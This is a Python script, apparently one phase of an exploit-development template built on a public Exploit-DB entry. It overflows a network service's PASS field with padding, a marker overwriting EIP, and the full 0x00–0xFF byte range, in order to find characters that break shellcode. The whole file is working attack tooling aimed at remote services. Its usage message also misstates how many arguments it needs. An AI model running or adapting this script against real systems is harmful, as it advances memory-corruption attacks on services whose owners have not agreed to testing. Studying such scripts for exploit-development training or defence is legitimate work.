#!/usr/bin/env python3
import socket, time, sys

# NOTE: This template used https://www.exploit-db.com/exploits/1582 as the example
# IMPORTANT: Dont forget to set up l_bytes

# Phase 4: Find bad chars

# ------------------------------------------------------------------
# How do we find bad chars?
# ------------------------------------------------------------------
# We send all character bytes from 00-FF. If any of the bytes prevent
# EIP from being controlled or "vanish" when the buffer is examined,
# these characters cannot be used in shellcode. We keep track of these
# bad chars and tell the shellcode generator so it wont use them

if len(sys.argv) != 6:
    print()
    print("Usage: {} <target ip> <target port> <offset of eip> <total size of payload>".format(sys.argv[0]))
    print("\tTarget IP: Remote hostname or IP address of target service")
    print("\tTarget Port: Remote port of target sevice")
    print("\tOffset of EIP: Offset of EIP from start of payload")
    print("\tTotal size of payload: Set to minimum if only confirming offset of EIP. Increase to test if bigger payload destabilizes control of EIP.")
    print("\tBad chars: The characters to avoid sending to target service expressed as hex characters i.e. '20 41 42 43' supresses <SPACE>,A,B,C")
    exit(0)

# sys.argv is the list of command line arguments
RHOST = 1
RPORT = 2
OFFSET_EIP = 3
TOTAL_PAYLOAD_SIZE = 4
BAD_CHARS = 5

l_rhost: str = sys.argv[RHOST]
l_rport: int = int(sys.argv[RPORT])
l_offset_eip: int = int(sys.argv[OFFSET_EIP])
l_total_payload_size: int = int(sys.argv[TOTAL_PAYLOAD_SIZE])
l_chars_to_supress: bytearray = bytes.fromhex(sys.argv[BAD_CHARS])

l_bad_chars = (
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

for l_byte in l_chars_to_supress:
    l_bad_chars = l_bad_chars.replace(chr(l_byte), '')

l_bytes_before_EIP: int = l_offset_eip
l_size_of_EIP: int = 4
l_bytes_after_EIP: int = l_total_payload_size - (l_offset_eip + l_size_of_EIP + len(l_bad_chars))
l_a = "A" * l_bytes_before_EIP
l_b = "B" * l_size_of_EIP
l_c = "C" * l_bytes_after_EIP
l_pattern = l_a.encode() + l_b.encode() + bytes(l_bad_chars, encoding='iso-8859-1') + l_c.encode()

try:
    # Create a TCP (socket)
    print("Connecting to {} port {}".format(l_rhost, l_rport))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((l_rhost, l_rport))
    print("Connected")
except:
    print("Could not connect to {} port {}".format(l_rhost, l_rport))
    exit(0)

time.sleep(2)

try:
    # Send the message via the socket using the specific protocol
    print("Sending USER parameter")
    l_bytes = 'USER jeremy\r\n'.encode()
    s.send(l_bytes)
    data = s.recv(1024)
    print("Data received: {}".format(data))
except:
    print("Could not send USER parameter")

time.sleep(2)

try:
    # Send the message via the socket using the specific protocol
    print("Sending PASS parameter of length {}".format(len(l_pattern)))
    l_bytes = 'PASS '.encode() + l_pattern + '\r\n'.encode()
    s.send(l_bytes)
    data = s.recv(1024)
    print("Data received: {}".format(data))
except:
    print("Could not send PASS parameter")

time.sleep(2)

s.close()
